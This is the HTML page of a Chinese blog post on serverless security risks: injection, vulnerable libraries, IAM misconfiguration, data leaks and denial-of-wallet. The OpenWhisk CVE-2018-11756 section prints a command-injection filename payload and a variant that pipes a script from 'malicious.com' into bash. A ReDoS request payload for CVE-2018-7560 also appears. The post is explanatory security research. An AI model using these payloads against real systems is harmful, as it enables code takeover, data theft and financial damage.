@@ -1,0 +1,830 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    
+    <meta property="og:site_name" content="Ming Blog">
+    <meta property="og:type" content="article">
+
+    
+    <meta property="og:image" content="https://puming.zone/img/bg.jpg">
+    <meta property="twitter:image" content="https://puming.zone/img/bg.jpg" />
+    
+
+    
+    <meta name="title" content="Serverless安全研究 — Serverless安全风险" />
+    <meta property="og:title" content="Serverless安全研究 — Serverless安全风险" />
+    <meta property="twitter:title" content="Serverless安全研究 — Serverless安全风险" />
+    
+
+    
+    <meta name="description" content="Serverless安全研究系列第二篇Serverless安全风险">
+    <meta property="og:description" content="Serverless安全研究系列第二篇Serverless安全风险" />
+    <meta property="twitter:description" content="Serverless安全研究系列第二篇Serverless安全风险" />
+    
+
+    
+    <meta property="twitter:card" content="summary" />
+    
+    
+
+    <meta name="keyword"  content="puming, 浦明, 浦明的博客, Puming Blog, 博客, Web, 云原生, Serverless, Istio, Kubernetes, 微服务, Microservice">
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>Serverless安全研究 — Serverless安全风险-浦明的博客</title>
+
+    <link rel="canonical" href="/post/2021-1-26-serverless%E5%AE%89%E5%85%A8%E9%A3%8E%E9%99%A9%E4%B8%8E%E5%A8%81%E8%83%81/">
+
+    <link rel="stylesheet" href="/css/iDisqus.min.css"/>
+
+    
+    <link rel="stylesheet" href="/css/bootstrap.min.css">
+
+    
+    <link rel="stylesheet" href="/css/hugo-theme-cleanwhite.min.css">
+
+    
+    <link rel="stylesheet" href="/css/zanshang.css">
+
+    
+    <link href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/css/all.min.css" rel="stylesheet" type="text/css">
+
+    
+    
+
+    
+    
+    <script src="/js/jquery.min.js"></script>
+
+    
+    <script src="/js/bootstrap.min.js"></script>
+
+    
+    <script src="/js/hux-blog.min.js"></script>
+
+    
+    
+
+</head>
+
+
+
+
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+
+    <div class="container-fluid">
+        
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/">Ming Blog</a>
+        </div>
+
+        
+        
+        <div id="huxblog_navbar">
+            <div class="navbar-collapse">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="/">Home</a>
+                    </li>
+                    
+                        
+                        <li>
+                            <a href="/categories/life">life</a>
+                        </li>
+                        
+                        <li>
+                            <a href="/categories/music">music</a>
+                        </li>
+                        
+                        <li>
+                            <a href="/categories/photography">photography</a>
+                        </li>
+                        
+                        <li>
+                            <a href="/categories/tech">tech</a>
+                        </li>
+                        
+                    
+                    
+		    
+                        <li><a href="/top/books/">BOOKS</a></li>
+                    
+                        <li><a href="/top/about/">ABOUT</a></li>
+                    
+
+                    
+                </ul>
+            </div>
+        </div>
+        
+    </div>
+    
+</nav>
+<script>
+    
+    
+    
+    var $body   = document.body;
+    var $toggle = document.querySelector('.navbar-toggle');
+    var $navbar = document.querySelector('#huxblog_navbar');
+    var $collapse = document.querySelector('.navbar-collapse');
+
+    $toggle.addEventListener('click', handleMagic)
+    function handleMagic(e){
+        if ($navbar.className.indexOf('in') > 0) {
+        
+            $navbar.className = " ";
+            
+            setTimeout(function(){
+                
+                if($navbar.className.indexOf('in') < 0) {
+                    $collapse.style.height = "0px"
+                }
+            },400)
+        }else{
+        
+            $collapse.style.height = "auto"
+            $navbar.className += " in";
+        }
+    }
+</script>
+
+
+
+
+<style type="text/css">
+    header.intro-header {
+        background-image: url('/img/Serverless%e5%ae%89%e5%85%a8%e9%a3%8e%e9%99%a9.jpg')
+    }
+</style>
+
+<header class="intro-header" >
+
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <div class="post-heading">
+                    <div class="tags">
+                        
+                        <a class="tag" href="/tags/security" title="Security">
+                            Security
+                        </a>
+                        
+                        <a class="tag" href="/tags/serverless" title="Serverless">
+                            Serverless
+                        </a>
+                        
+                        <a class="tag" href="/tags/cloud-native" title="Cloud Native">
+                            Cloud Native
+                        </a>
+                        
+                    </div>
+                    <h1>Serverless安全研究 — Serverless安全风险</h1>
+                    <h2 class="subheading"></h2>
+                    <span class="meta">
+                        
+                            Posted by 
+                            
+                                     &#34;Pu Ming&#34;
+                             
+                            on 
+                            Tuesday, January 26, 2021
+                            
+                            
+                            
+                            
+                    </span>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+
+
+
+<article>
+    <div class="container">
+        <div class="row">
+
+            
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                post-container">
+
+                
+                <p>本文转自绿盟科技研究通讯公众号 <a href="https://mp.weixin.qq.com/s?__biz=MzIyODYzNTU2OA==&amp;mid=2247488798&amp;idx=1&amp;sn=485e2131f347ff4d8c3b5b3286b36c97&amp;scene=21#wechat_redirect">《Serverless安全研究 — Serverless安全风险》</a></p>
+<h1 id="一专题信息">一.专题信息</h1>
+<p>专题： Serverless安全研究</p>
+<p>标签： Serverless安全风险</p>
+<p>往期回顾：</p>
+<p><a href="https://mp.weixin.qq.com/s/kNawzZowQt8hwiE5Z8wIQQ">《Serverless安全研究 — Serverless概述》</a></p>
+<h1 id="二引言">二.引言</h1>
+<p>通过上一篇<a href="https://mp.weixin.qq.com/s/kNawzZowQt8hwiE5Z8wIQQ">《Serverless安全研究 — Serverless概述》</a>相信各位读者已经对Serverless有了一个大致的理解，本文为Serverless安全研究系列的安全风险篇，笔者将从Serverless安全架构介绍出发，对目前Serverless面临的安全风险进行分析解读，并针对每种风险提供相应的攻击实例，希望可以引发各位读者更多的思考。</p>
+<h1 id="三serverless安全架构">三.Serverless安全架构</h1>
+<p>
+  <figure>
+    <img src="/img/Serverless%e5%ae%89%e5%85%a8%e9%a3%8e%e9%99%a9/%e5%9b%be1.jpg" alt="image">
+    <center><figcaption>图1. Serverless安全责任共享模型图</figcaption></center>
+  </figure>
+
+</p>
+<p>图1为Serverless环境下安全责任共享模型图，图中不难看出FaaS提供商负责云环境的安全管理，主要包括数据中心集群、存储、网络、数据、计算、操作系统等，除此之外，应用程序逻辑、代码、客户端数据、访问控制等同时需要安全防护能力，这一部分是应用开发者的责任。</p>
+<p>上一篇文章中提到的，Serverless有一大局限性便是供应商锁定问题，FaaS提供商非常之多，每一家厂商均有着不同的安全解决方案和各自的实现机制，因缺乏统一标准，故本文笔者将不对FaaS平台面临的安全风险进行阐述，重点放在开发者侧面临的安全风险上。</p>
+<p>通过近期的调研，笔者总结并绘制了一幅Serverless安全风险脑图，如下所示：</p>
+<p>
+  <figure>
+    <img src="/img/Serverless%e5%ae%89%e5%85%a8%e9%a3%8e%e9%99%a9/%e5%9b%be2.jpg" alt="image">
+    <center><figcaption>图2. Serverless安全风险脑图</figcaption></center>
+  </figure>
+
+</p>
+<p>笔者将Serverless开发者测的安全风险简单分为五类，以下笔者会针对每一类进行分析说明。</p>
+<h1 id="四serverless安全风险">四.Serverless安全风险</h1>
+<h2 id="41-针对应用程序代码的注入攻击">4.1 针对应用程序代码的注入攻击</h2>
+<p>应用程序内部由于开发者未对外界输入数据进行过滤或编码，因而经常导致SQL注入、系统命令执行等攻击行为。过去的传统应用程序中，开发者可根据自身实战经验在数量有限的可能性中轻易判定出恶意输入来源，而Serverless模式下的函数调用由事件源触发，输入来源的不确定性限制了开发者的判定，以下是函数的事件源示意图：</p>
+<p>
+  <figure>
+    <img src="/img/Serverless%e5%ae%89%e5%85%a8%e9%a3%8e%e9%99%a9/%e5%9b%be3.jpg" alt="image">
+    <center><figcaption>图3. 函数事件源触发示意图</figcaption></center>
+  </figure>
+
+</p>
+<p>通常来说，当函数订阅一个事件源后，该函数在该类型的事件发生时被触发，这些事件可能来源于FaaS平台内部或外部，也可能是来源于未知的，对于来源未知的事件源可被开发者标注为不受信任。在实际应用场景中，开发者并没有良好的习惯对事件源进行分类，常将不受信任的事件错认为是平台内部事件因此常被视为受信任的输入来处理，导致了大量注入攻击的发生。</p>
+<p>有关Serverless应用程序的注入攻击实例研究可参考OWASP（Open Web Application Security Platform）组织在2017年发布的《Top 10 Interpretation for Serverless》报告【7】</p>
+<h2 id="42-针对应用程序依赖库漏洞的攻击">4.2 针对应用程序依赖库漏洞的攻击</h2>
+<p>开发者在编写应用程序时不可避免的会引入第三方依赖库，毕竟有许多现成的实现逻辑无需开发者自己编写，这样就面临一个非常严峻的问题 — 开发者是否使用了含有漏洞的依赖库？据Synk公司在2019年的开源软件安全报告中【8】透露，已知的应用程序安全漏洞在过去两年增加了88%【2】。我们不妨试想如果开发者编写的函数只有短短几十行代码，但同时引入了第三方含有漏洞的依赖库，那么即使函数编写的再安全也是无济于事的。此外，引入了第三方依赖库也会实际增加应用部署至服务器的代码总量，例如python库，其代码量可能是上千行，node.js的npm包中的代码量就更大了，可能会导致上万行，随着代码量的增多，攻击面也相应增加，从而给客户端程序带来了极大安全隐患。</p>
+<p>近年来，随着业界对不安全的第三方依赖库的重视，许多行内报告包括OWASP Top 10项目均提出了使用已知漏洞库的安全风险，这些含有漏洞的依赖库可在CVE、NVD等网站上进行查询，在此笔者列出Serverless场景下使用率较高的三种开发语言库漏洞列表供各位读者参考【3】，细节由于篇幅原因不予赘述。</p>
+<p><strong>已知的Node.js库CVE漏洞列表：https://www.npmjs.com/advisories</strong></p>
+<p><strong>已知的Java库CVE漏洞列表：https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=java</strong></p>
+<p><strong>已知的Python库CVE漏洞列表: <a href="https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=python">https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=python</a></strong></p>
+<p>关于Serverless第三方依赖库漏洞本文在3.5小节有一个实例分享，详情见下文。</p>
+<h2 id="43-针对应用程序访问控制权限的攻击">4.3 针对应用程序访问控制权限的攻击</h2>
+<p>访问控制作为应用程序的一大安全风险在Serverless场景下也同样存在，例如函数对某资源的访问权限、可以触发函数执行的事件等。试想这么一个场景，函数执行业务逻辑时不可避免会对数据库进行CRUD操作，在此期间，我们需要给予函数对数据库的读写权限。在不对数据库进行其它操作时，我们应当给予只读权限或关闭其权限，如果此时开发者将权限错误的更改为读写操作，攻击者会利用此漏洞对数据库展开攻击，从而增加了攻击面。</p>
+<p>下述示例是AWS Lambda函数的代码片段【2】</p>
+<pre><code>#...
+
+dynamodb_client.put_item(TableName=TABLE_NAME,
+Item={
+&quot;name&quot; : {&quot;S&quot;: name},
+&quot;sex&quot; : {&quot;S&quot;: sex},
+&quot;phonenum&quot; : {&quot;S&quot;:phone_num },
+&quot;address&quot; : {&quot;S&quot;: address},
+&quot;create_time&quot; : {&quot;S&quot;: str(datatime.utcnow().split('.'))[0]},
+&quot;requestid&quot; {&quot;S&quot;: context.aws_request_id}
+}
+)
+</code></pre>
+<p>上述Serverless函数接收数据并使用DynamoDB的put_item()方法将数据存入数据库，函数看起来没有问题，但从如下部署函数的serverless.yml文件看出，开发人员犯了一个严重的错误：</p>
+<pre><code>- Effect: Allow
+    Action:
+    - ‘dynamodb:*’ 
+    Resource:
+    - ‘arn:aws:dynamodb:cn-west:**************:table/TABLE_NAME’
+</code></pre>
+<p>可以看出开发人员授予了dynamodb的所有访问权限（*），这么做是十分危险的，针对以上Serverless函数正确的做法是只赋予该函数对数据库的PutItem权限，如下述所示：</p>
+<pre><code>- Effect: Allow
+    Action:
+    - ‘dynamodb: PutItem’
+    Resource:
+    - ‘arn:aws:dynamodb:cn-west:**************:table/TABLE_NAME’
+</code></pre>
+<p>Gartner预测，到2020年，95%的云安全问题将由用户错误的使用配置引起。Serverless中，应用可能会由许多函数组成，函数间的访问权限，函数与资源的权限映射非常多，高效率管理权限和角色成为了一项繁琐的问题，许多开发者简单粗暴地为所有函数配置单一权限和角色，这样做会导致单一漏洞扩展至整个应用的风险。</p>
+<h2 id="44-针对应用程序数据泄露的攻击">4.4 针对应用程序数据泄露的攻击</h2>
+<p>在应用程序中，敏感数据信息泄漏、应用程序日志泄漏、应用程序访问密钥泄漏、应用程序未采用HTTPS协议进行加密等是一些常见的数据安全风险，通过调研我们发现，这些事件的产生原因多是由于开发者的不规范操作引起，比较著名事件有2017年Uber公司由于开发人员误将AWS S3存储的密钥硬编码在应用程序中并公开在Github上，进而导致5700万用户数据遭到泄漏【9】，Uber公司也最终通过支付1.48亿美金作为违约和解，付出了惨重的代价；2019年5月，国外著名社交网站Instagram，一个在AWS上的数据库因为开发人员的误配置导致可无口令访问，从而引发4900万用户的个人信息遭到泄漏【10】，其中包括图片、粉丝数、地理位置、电话、邮件等敏感数据。需要注意的是，在Serverless中以上这些风险同样存在，但与传统的应用程序不同的是：</p>
+<ol>
+<li>针对攻击数据源的不同，传统应用只是从单一服务器上获取敏感数据，而Serverless架构中攻击者可针对各种数据源进行攻击，例如云存储（AWS S3）或DynamoDB等，因此攻击面更广一些；</li>
+<li>Serverless应用由许多函数组成，无法像传统应用程序使用单个集中式配置文件存储的方式，因此开发人员多使用环境变量替代。虽然存储更为简单，但使用环境变量本是一个不安全的行为；</li>
+<li>传统的应用开发人员并不具备丰富的Serverless的密钥管理经验，不规范的操作易造成敏感数据泄露的风险；</li>
+</ol>
+<p>2018年6月，著名开源Serverless平台Apache OpenWhisk曝出CVE-2018-11756漏洞【11】，该漏洞由Puresec公司的YuriShapira安全研究员发现，其指出在应用程序含有漏洞的情形下，攻击者可能会利用漏洞覆盖被执行的Serverless函数源代码，并持续影响函数后续的每次执行，如果攻击者对函数代码进行精心伪造，可进一步造成数据泄露、RCE（远程代码执行）等风险，为了更清晰的说明此CVE漏洞的风险，以下是一个完整的示例【5】：
+在OpenWhisk中，每个Serverless函数都在一个Docker容器中运行，OpenWhisk通过RestfulAPI与容器内部的Serverless函数进行交互，该API可通过本地8080端口进行访问，此API提供两个操作：</p>
+<p><strong>/init:  接收容器内被执行函数的源代码</strong></p>
+<p><strong>/run:  接收该函数的参数并运行代码</strong></p>
+<p>由于OpenWhisk并没有对/init调用进行有效限制，所以攻击者可以利用应用程序漏洞强制Serverless函数发送一个HTTP POST请求到http://localhost:8080/init，从而覆盖之前接收到的函数源代码，换而言之，攻击者构造的危险函数体将被执行，下述是简易的攻击流程图【6】：</p>
+<p>
+  <figure>
+    <img src="/img/Serverless%e5%ae%89%e5%85%a8%e9%a3%8e%e9%99%a9/%e5%9b%be4.jpg" alt="image">
+    <center><figcaption>图4. CVE-2018-11756攻击简易图</figcaption></center>
+  </figure>
+
+</p>
+<p>该函数接收一个PDF文件并通过pdftotext命令行工具将其转换为文本，不难看出如果该应用程序中存在输入参数校验漏洞，攻击者可通过控制文件名的输入进行恶意攻击。</p>
+<p>以下是攻击者构造的恶意函数输入，主要有包含以下三部分内容：</p>
+<ol>
+<li>安装curl命令</li>
+<li>提交相关请求至http://localhost:8080/init</li>
+<li>在当前容器中重写函数源码</li>
+</ol>
+<p>以下是攻击者构造的恶意Payload:</p>
+<pre><code>{ &quot;filename&quot;: &quot;; apt update &amp;&amp; apt install -y curl &amp;&amp; curl --max-time 5 -d '{\&quot;value\&quot;:{\&quot;code\&quot;:\&quot;def main(dict):\\n return {\\\&quot;msg\\\&quot;:\\\&quot;FOOBAR\\\&quot;}\\n\&quot;}}' -H \&quot;Content-Type: application\/json\&quot; -X POST http:\/\/localhost:8080\/init&quot; &quot;Source_url&quot;: &quot;http://www.some.site/file.pdf }
+</code></pre>
+<p>最终函数被执行后输出以下信息：</p>
+<pre><code>ActivationID: f9dee7f9c9fc4a839ee7f9c9fc8a8305Results: {
+    &quot;output&quot;: [
+        &quot;Get:1 http://security.debian.org jessie/updates InRelease [94.4 kB]\nGet:2
+http://security.debian.org jessie/updates/main amd64 Packages [623 kB]\nIgn
+http://deb.debian.org jessie InRelease\nGet:3 http://deb.debian.org jessie-updates
+InRelease [145 kB]\nGet:4 http://deb.debian.org jessie Release.gpg [2434 B]\nGet:5
+http://deb.debian.org jessie-updates/main amd64 Packages [23.0 kB]\nGet:6
+http://deb.debian.org jessie Release [148 kB]\nGet:7 http://deb.debian.org jessie/main
+amd64 Packages [9064 kB]\nFetched 10.1 MB in 2s (4339 kB/s)\nReading package
+lists...\nBuilding dependency tree...\nReading state information...\n3 packages can be
+upgraded. Run 'apt list --upgradable' to see them.\nReading package lists...\nBuilding
+dependency tree...\nReading state information...\nThe following extra packages will be
+installed:\n krb5-locales libcurl3 libgnutls-deb0-28 libgssapi-krb5-2 libhogweed2\n
+libidn11 libk5crypto3 libkeyutils1 libkrb5-3 libkrb5support0 libldap-2.4-2\n libnettle4
+libp11-kit0 librtmp1 libsasl2-2 libsasl2-modules\n libsasl2-modules-db libssh2-1
+libtasn1-6\nSuggested packages:\n gnutls-bin krb5-doc krb5-user libsasl2-modules-otp
+libsasl2-modules-ldap\n li
+…
+… since apt-utils is not installed\n % Total % Received % Xferd Average Speed Time
+Time Time Current\n Dload Upload Total Spent
+Left Speed\n\r 0 0 0 0 0 0 0 0 --:--:-- --:--:-- --:--:--
+0\r100 82 0 0 100 82 0 67 0:00:01 0:00:01 --:--:-- 67\r100
+82 0 0 100 82 0 37 0:00:02 0:00:02 --:--:-- 37\r100 82 0
+0 100 82 0 25 0:00:03 0:00:03 --:--:-- 25\r100 82 0 0 100
+82 0 19 0:00:04 0:00:04 --:--:-- 19curl: (28) Operation timed out after 5000
+milliseconds with 0 bytes received\n&quot;
+    ]
+}
+Logs: []
+</code></pre>
+<p>如果函数后续再次被执行将会导致以下输出：</p>
+<pre><code>ActivationID: 0d6b88cadf98406dab88cadf98906d3dResults: {
+    &quot;msg&quot;: &quot;FOOBAR&quot;
+}Logs: []
+</code></pre>
+<p>从恶意Payload可以看出攻击者通过安装curl请求对/init操作进行了调用，替换的函数源码为：</p>
+<pre><code>def main(dict):
+    return {&quot;msg&quot;:&quot;FOOBAR&quot;}
+</code></pre>
+<p>从内容看这个函数体并没有什么恶意， 但也替换了函数原有的功能。</p>
+<p>如果将函数体进行简单更改，如下所示：</p>
+<pre><code>from subprocess import Popen, PIPE
+
+def main(dict):
+    proc = Popen(&quot;wget -q -O- http://www.malicious.com/sensitive_data_leak.sh | bash&quot;, shell=True, stdout=PIPE, stderr=PIPE) 
+    return {&quot;msg&quot;:&quot;FOOBAR&quot;}
+</code></pre>
+<p>从main函数内容，我们可以看出由攻击者构造的敏感数据泄露脚本将被下载执行，为Serverless函数带来了极大隐患。此外，由于/init的调用不受限制，因此函数可以多次被初始化，并且初始化中可以嵌套多层恶意脚本因而攻击者可对Serverless进行逐步的试探性攻击，最终达到入侵目的。</p>
+<h2 id="45-针对serverless平台账户的dos攻击">4.5 针对Serverless平台账户的DoS攻击</h2>
+<p>针对平台账户的攻击主要为DoW（Denial of Wallet）攻击，顾名思义指拒绝钱包攻击的意思，为DoS的变种攻击，目的为耗尽账户月账单的金额。Serverless具备一个重要特性为自动化弹性扩展，这一特性是Serverless备受欢迎的原因之一，也同时使开发人员只需为函数调用次数付费，函数弹性扩展的事情交给了云厂商，但其产生的费用通常不是默认受到保护的，试想如果攻击者掌握了事件触发器，并通过API调用了大量函数资源，那么在未受保护情况下函数将极速扩展，随之产生的费用也呈指数增长，最终会导致开发者的账户被DoS，造成了重大损失。另外，即便受到保护的情况下，也未必可以完全规避风险，例如云厂商替开发者设置了调用频次上限，虽然开发者的钱包受到了保护，但攻击者也通过攻击频次达到设定上限实现了对开发者账户DoS的目的。</p>
+<p>2018年2月， NodeJS  「aws-lambda-multipart-parser」库被曝出ReDoS漏洞（CVE-2018-7560）【12】,该漏洞由PureSec安全团队发现，其团队人员通过分析指出此漏洞可导致部署在AWS上并使用了该库的Lambda函数停止并直到函数运行超时，攻击者可利用此漏洞构造大量并发请求从而耗尽服务器资源或对开发者账户造成DoW攻击。</p>
+<p>「aws-lambda-multipart-parser」库的主要用途为向AWS Lambda开发者提供接口，从而在Serverless场景下可支持对multipart/form-data 类型请求的解析。参考RFC 2388对multipart/form-data【15】标准的定义，下述为一个简单的HTTP POST请求，其使用了multipart/form-data作为HTTP content type字段的内容：</p>
+<pre><code>POST /app HTTP/1.1
+HOST: example.site 
+Content-Length: xxxxxx
+Content-Type: multipart/form-data; boundary = ”-- boundary”
+-- boundary
+Content-Disposition; form-data; name=”filed1”
+Value1
+-- boundary
+Content-Disposition; form-data; name=”filed2”
+Value2
+-- boundary
+...
+</code></pre>
+<p>从上述请求内容中我们可看出Content-Type字段中包含boundary项，RFC 1341【14】定义了该字段，主要用于区分表单中请求体的内容，boundary由客户端指定，上述示例可以看到通过”&ndash;boundary” 将表单中的filed1字段及filed2字段内容进行了边界界定。</p>
+<p>下面是aws-lambda-multipart-parser库中包含漏洞的代码片段【4】：</p>
+<pre><code>module.export.parse = (event,spotText) =&gt; {
+        const boundary = getValueIgnoringKeyCase(event.headers,’Content-Type’).split(‘=’)[1];
+            const body = (event.isBase64Encoded ? Buffer.from(event.body,’base64’).toString(‘binary’) : event.body).split(new RegExp(boundary)).filter(item =&gt; item.match(/Content-Disposition))
+}
+</code></pre>
+<p>从上述代码中我们可以看出boundry字符串从请求Header的Content-Type字段中获取，请求体通过boundry字符串进行拆分，其中拆分用到了split()方法，该方法接收参数可以是一个字符串也可以是正则表达式，此处开发人员通过RegExp()构造函数将boundry作为正则内容并在split()方法中使用，这是一个非常危险的写法，因为请求体与boundry全由客户端控制，攻击者可通过构造耗时的正则表达式和请求体进行ReDoS攻击，下面是一个恶意请求的示例：</p>
+<pre><code>POST /app HTTP/1.1
+
+HOST: xxxxxx.excute-api.cn-west-1.amazonaws.com
+Content-Length: xxxxxx
+Content-Type: multipart/form-data; boundary = (.+)+$
+Connection: keep-alive
+(.+)+$
+Content-Disposition; form-data; name=”text”
+xxxxx
+(.+)+$
+Content-Disposition; form-data; name=”file1”; filename=”a.txt”
+Content-Type: text/plain
+Content of a.txt.
+(.+)+$
+Content-Disposition; form-data; name=”file2”; filename=”a.html”
+Content-Type: text/plain
+&lt;!DOCTYPE html&gt;&lt;title&gt;.Content of a.html&lt;/.title&gt;
+(.+)+$
+...
+</code></pre>
+<p>在上述示例中，根据OWASP 对ReDoS的解释【13】,我们可以看出攻击者选取了效率极低的正则表达式 (.+)+$作为boundary字段的值，上述恶意请求将会在短时间内引发100%的CPU占用率，在针对使用此漏洞库的AWS Lambda函数进行测试时，该函数会运行停止并最终超时，如果攻击者对AWS Lambda函数发送大量并发恶意请求，将会导致函数在单位时间内被大量执行，最终导致账户的账单受到损失。</p>
+<h1 id="五-总结">五. 总结</h1>
+<p>根据云原生产业联盟（CNIA）近期发表的《云原生用户调查报告》中得出，目前国内Serverless技术总体呈上升趋势，参与调查的各行各业用户群体中有近百分之三十的用户已在生产环境中使用【1】。在Serverless的部署过程中，面临诸多挑战，例如线上调试、环境监控、测试工具、代码打包、接入管理等，由此可见部署成本是用户选择Serverless技术的主要考虑因素，而安全作为业务稳定运行的基石，在整个开发部署环节中也是不可或缺的一环，在Serverless架构带来新的云计算模式下，应用必然会衍生新的安全风险，作为安全从业人员应当紧追技术前进的步伐，本文笔者通过近期调研结合实例对Serverless的安全风险进行了介绍，Serverless技术的探索还将继续进行，下一篇笔者会根据本文提出的Serverless安全风险分享相应的防护思路，希望可以给各位读者带来更多思考。</p>
+<h1 id="六-参考文献">六. 参考文献</h1>
+<ol>
+<li>《中国云原生用户调查报告 》http://www.caict.ac.cn/kxyj/qwfb/ztbg/202010/P020201021543952384452.pdf</li>
+<li>《OReilly Serverless Security》 <a href="https://www.oreilly.com/library/view/serverless-security/9781492082538/">https://www.oreilly.com/library/view/serverless-security/9781492082538/</a></li>
+<li><a href="https://github.com/puresec/awesome-serverless-security">https://github.com/puresec/awesome-serverless-security</a></li>
+<li><a href="https://securityboulevard.com/2018/03/redos-vulnerability-in-aws-lambda-multipart-parser-node-package/">https://securityboulevard.com/2018/03/redos-vulnerability-in-aws-lambda-multipart-parser-node-package/</a></li>
+<li><a href="https://www.puresec.io/hubfs/Apache%20OpenWhisk%20PureSec%20Security%20Advisory.pdf">https://www.puresec.io/hubfs/Apache%20OpenWhisk%20PureSec%20Security%20Advisory.pdf</a></li>
+<li><a href="https://www.puresec.io/hubfs/OpenWhisk%20Weakness%20-%20Diagram.png">https://www.puresec.io/hubfs/OpenWhisk%20Weakness%20-%20Diagram.png</a></li>
+<li><a href="https://www.owasp.org/index.php/OWASP_Serverless_Top_10_Project">https://www.owasp.org/index.php/OWASP_Serverless_Top_10_Project</a>。</li>
+<li><a href="https://snyk.io/opensourcesecurity-2019">https://snyk.io/opensourcesecurity-2019</a></li>
+<li><a href="https://www.wired.com/story/uber-paid-off-hackers-to-hide-a-57-million-user-data-breach/#:~:text=According%20to%20Bloomberg%2C%20Uber's%202016,of%20the%20software%20repository%20Github.&amp;text=%22This%20is%20all%20too%20common%20on%20Github">https://www.wired.com/story/uber-paid-off-hackers-to-hide-a-57-million-user-data-breach/#:~:text=According%20to%20Bloomberg%2C%20Uber's%202016,of%20the%20software%20repository%20Github.&amp;text=%22This%20is%20all%20too%20common%20on%20Github</a>.</li>
+<li><a href="https://www.cpomagazine.com/cyber-security/instagram-data-leak-exposes-account-information-including-full-names-and-phone-numbers/">https://www.cpomagazine.com/cyber-security/instagram-data-leak-exposes-account-information-including-full-names-and-phone-numbers/</a></li>
+<li><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-11756">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-11756</a></li>
+<li><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7560">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7560</a></li>
+<li><a href="https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS">https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS</a></li>
+<li><a href="https://tools.ietf.org/html/rfc1341">https://tools.ietf.org/html/rfc1341</a></li>
+<li><a href="https://tools.ietf.org/html/rfc2388">https://tools.ietf.org/html/rfc2388</a></li>
+</ol>
+
+
+                
+                
+<div class="entry-shang text-center">
+    
+	    <p>「真诚赞赏，手留余香」</p>
+	
+	<button class="zs show-zs btn btn-bred">赞赏支持</button>
+</div>
+<div class="zs-modal-bg"></div>
+<div class="zs-modal-box">
+	<div class="zs-modal-head">
+		<button type="button" class="close">×</button>
+		<span class="author"><a href="https://puming.zone"><img src="/img/favicon.png" />Ming Blog</a></span>
+        
+	        <p class="tip"><i></i><span>真诚赞赏，手留余香</span></p>
+		
+ 
+	</div>
+	<div class="zs-modal-body">
+		<div class="zs-modal-btns">
+			<button class="btn btn-blink" data-num="2">2元</button>
+			<button class="btn btn-blink" data-num="5">5元</button>
+			<button class="btn btn-blink" data-num="10">10元</button>
+			<button class="btn btn-blink" data-num="50">50元</button>
+			<button class="btn btn-blink" data-num="100">100元</button>
+			<button class="btn btn-blink" data-num="1">任意金额</button>
+		</div>
+		<div class="zs-modal-pay">
+			<button class="btn btn-bred" id="pay-text">2元</button>
+			<p>使用<span id="pay-type">微信</span>扫描二维码完成支付</p>
+			<img src="/img/reward/wechat-2.png"  id="pay-image"/>
+		</div>
+	</div>
+	<div class="zs-modal-footer">
+		<label><input type="radio" name="zs-type" value="wechat" class="zs-type" checked="checked"><span ><span class="zs-wechat"><img src="/img/reward/wechat-btn.png"/></span></label>
+		<label><input type="radio" name="zs-type" value="alipay" class="zs-type" class="zs-alipay"><img src="/img/reward/alipay-btn.png"/></span></label>
+	</div>
+</div>
+<script type="text/javascript" src="/js/reward.js"></script>
+
+                
+
+                <hr>
+                <ul class="pager">
+                    
+                    <li class="previous">
+                        <a href="/post/2021-1-26-%E9%9A%8F%E7%AC%94/" data-toggle="tooltip" data-placement="top" title="夜晚随笔">&larr;
+                            Previous Post</a>
+                    </li>
+                    
+                    
+                    <li class="next">
+                        <a href="/post/2021-1-29-serverless%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4/" data-toggle="tooltip" data-placement="top" title="Serverless安全研究 — Serverless安全防护">Next
+                            Post &rarr;</a>
+                    </li>
+                    
+                </ul>
+                
+
+            </div>
+
+            
+            
+            <div class="
+                col-lg-2 col-lg-offset-0
+                visible-lg-block
+                sidebar-container
+                catalog-container">
+                <div class="side-catalog">
+                    <hr class="hidden-sm hidden-xs">
+                    <h5>
+                        <a class="catalog-toggle" href="#">CATALOG</a>
+                    </h5>
+                    <ul class="catalog-body"></ul>
+                </div>
+            </div>
+            
+
+            
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+                
+                
+                <section>
+                    <hr class="hidden-sm hidden-xs">
+                    <h5><a href="/tags/">FEATURED TAGS</a></h5>
+                    <div class="tags">
+                        
+                        
+                        
+                        <a href="/tags/anan" title="anan">
+                            anan
+                        </a>
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        <a href="/tags/application" title="application">
+                            application
+                        </a>
+                        
+                        
+                        
+                        
+                        
+                        <a href="/tags/cloud-native" title="cloud-native">
+                            cloud-native
+                        </a>
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        <a href="/tags/kubernetes" title="kubernetes">
+                            kubernetes
+                        </a>
+                        
+                        
+                        
+                        <a href="/tags/life" title="life">
+                            life
+                        </a>
+                        
+                        
+                        
+                        
+                        
+                        
+                        
